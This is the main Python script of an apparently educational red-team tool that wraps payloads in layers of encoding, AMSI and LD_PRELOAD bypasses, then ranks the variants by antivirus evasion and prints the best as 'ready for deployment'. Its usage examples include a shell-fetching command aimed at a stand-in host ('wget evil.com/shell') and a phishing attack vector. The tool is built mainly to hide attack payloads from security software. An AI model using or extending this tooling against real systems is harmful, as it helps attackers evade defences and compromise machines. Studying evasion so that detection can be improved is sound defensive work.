#!/usr/bin/env python3
"""
Advanced Payload Encoder & Obfuscation Framework
Author: Rahul Raval - Cybersecurity Engineer
Purpose: Educational red team evasion techniques demonstration
"""

import argparse
import sys
import os
import json
from pathlib import Path

# Add project root to path
sys.path.append(str(Path(__file__).parent))

from encoders.base64 import Base64Encoder
from encoders.xor import XOREncoder
from encoders.rot13 import ROT13Encoder
from obfuscators.unicode import UnicodeObfuscator
from obfuscators.junk_scatter import JunkScatter
from obfuscators.fragment import Fragmenter
from bypasses.amsi_windows import AMSIBypass
from bypasses.ld_preload_linux import LDPreloadBypass
from tester import DetectionTester
from reporter import Reporter

class PayloadFramework:
    def __init__(self):
        self.chains = {
            'basic': ['base64', 'unicode'],
            'stealth': ['unicode', 'base64', 'xor', 'junk'],
            'full': ['unicode', 'base64', 'xor', 'junk', 'fragment', 'amsi', 'ld_preload']
        }
        
        self.components = {
            'base64': Base64Encoder(),
            'xor': XOREncoder(),
            'rot13': ROT13Encoder(),
            'unicode': UnicodeObfuscator(),
            'junk': JunkScatter(),
            'fragment': Fragmenter(),
            'amsi': AMSIBypass(),
            'ld_preload': LDPreloadBypass()
        }
        
        self.tester = DetectionTester()
        self.reporter = Reporter()

    def build_chain(self, chain_type, target_os):
        """Smart chain builder based on target and vector"""
        base_chains = {
            'basic': ['unicode', 'base64'],
            'stealth': ['unicode', 'base64', 'xor', 'junk'],
            'full_windows': ['unicode', 'base64', 'xor', 'junk', 'fragment', 'amsi'],
            'full_linux': ['unicode', 'base64', 'xor', 'junk', 'fragment', 'ld_preload'],
            'full': ['unicode', 'base64', 'xor', 'junk', 'fragment']
        }
        
        # OS-specific full chains
        if chain_type == 'full':
            if target_os == 'windows':
                return base_chains['full_windows']
            elif target_os == 'linux':
                return base_chains['full_linux']
            else:  # both - use basic full without OS bypasses
                return base_chains['full']
        
        return base_chains.get(chain_type, base_chains['basic'])

    def process_payload(self, payload, chain, verbose=False):
        """Apply obfuscation chain to payload"""
        result = payload
        applied_layers = []
        
        if verbose:
            print(f"\n🔄 Starting obfuscation process...")
            print(f"📝 Original payload: '{payload}'")
            print(f"🔗 Chain to apply: {' → '.join(chain)}")
            print("\n" + "="*50)
        
        for i, layer in enumerate(chain, 1):
            if layer in self.components:
                try:
                    old_result = result
                    result = self.components[layer].encode(result)
                    applied_layers.append(layer)
                    
                    if verbose:
                        print(f"\n[{i}/{len(chain)}] 🔧 Applying {layer.upper()} layer...")
                        print(f"📥 Input:  '{old_result[:50]}{'...' if len(old_result) > 50 else ''}'")
                        print(f"📤 Output: '{result[:50]}{'...' if len(result) > 50 else ''}'")
                        print(f"✅ {layer.capitalize()} encoding applied successfully")
                        
                except Exception as e:
                    if verbose:
                        print(f"❌ Layer {layer} failed: {e}")
                    continue
        
        if verbose:
            print("\n" + "="*50)
            print(f"🏁 Obfuscation complete!")
            print(f"📊 Applied {len(applied_layers)} layers: {' → '.join(applied_layers)}")
            print(f"📏 Original length: {len(payload)} → Final length: {len(result)}")
        
        return result, applied_layers

    def generate_variants(self, payload, chain, count, verbose=False):
        """Generate multiple obfuscated variants"""
        variants = []
        
        print(f"\n🔄 Generating {count} variants...")
        if verbose:
            print("\n" + "="*60)
        
        for i in range(count):
            if verbose:
                print(f"\n🎲 VARIANT {i+1}:")
                print("-" * 30)
            
            # Add randomization to components
            for comp in self.components.values():
                if hasattr(comp, 'randomize'):
                    comp.randomize()
            
            obfuscated, layers = self.process_payload(payload, chain, verbose)
            evasion_score = self.tester.test_payload(obfuscated)
            
            variants.append({
                'id': i + 1,
                'payload': obfuscated,
                'layers': layers,
                'evasion_score': evasion_score,
                'status': '✅ CLEAN' if evasion_score >= 90 else '⚠️ PARTIAL' if evasion_score >= 50 else '❌ DETECTED'
            })
            
            # Progress indicator
            status_msg = f"Variant {i+1}: {evasion_score}% evasion {variants[-1]['status']}"
            if verbose:
                print(f"\n📊 {status_msg}")
                print(f"🎯 Final payload preview: '{obfuscated[:100]}{'...' if len(obfuscated) > 100 else ''}'")
            else:
                print(status_msg)
        
        return variants

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Payload Obfuscation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --payload "whoami" --chain full --variants 10 --test
  python main.py --target windows --vector phishing --variants 20 --test-av
  python main.py --target linux --payload "wget evil.com/shell" --test
        """
    )
    
    parser.add_argument('--payload', help='Payload to obfuscate')
    parser.add_argument('--file', help='Path to payload file')
    parser.add_argument('--chain', choices=['basic', 'stealth', 'full'], default='stealth', help='Obfuscation chain')
    parser.add_argument('--target', choices=['windows', 'linux', 'both'], default='both', help='Target OS')
    parser.add_argument('--variants', type=int, default=5, help='Number of variants to generate')
    parser.add_argument('--verbose', action='store_true', help='Show detailed processing steps')
    parser.add_argument('--test', action='store_true', help='Test against detection engines')
    parser.add_argument('--test-av', action='store_true', help='Test against AV signatures')
    parser.add_argument('--vector', choices=['phishing', 'web', 'network'], help='Attack vector')
    parser.add_argument('--output', help='Output file for results (JSON)')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.payload and not args.file:
        parser.error('Either --payload or --file must be provided')
    
    # Load payload
    if args.file:
        try:
            with open(args.file, 'r') as f:
                payload = f.read().strip()
            print(f"Loading payload from: {args.file}")
        except FileNotFoundError:
            print(f"❌ Error: File {args.file} not found")
            sys.exit(1)
    else:
        payload = args.payload
    
    framework = PayloadFramework()
    
    print("🎯 Advanced Payload Obfuscation Framework")
    print("=" * 50)
    print(f"Original Command: {payload}")
    
    # Build appropriate chain
    chain = framework.build_chain(args.chain, args.target)
    print(f"🔗 Chain: {' → '.join(chain)}")
    
    # Generate variants
    variants = framework.generate_variants(payload, chain, args.variants, args.verbose)
    
    # Find best variant
    best = max(variants, key=lambda x: x['evasion_score'])
    print(f"\n🏆 BEST: Variant {best['id']} - {best['evasion_score']}% evasion")
    print(f"Ready for deployment: {best['payload']}")
    
    # Generate report
    if args.output:
        framework.reporter.generate_report(variants, args.output)
        print(f"📊 Report saved to {args.output}")
    
    # Additional testing
    if args.test_av:
        print("\n🛡️  AV Engine Testing...")
        framework.tester.test_av_engines(best['payload'])

if __name__ == "__main__":
    main()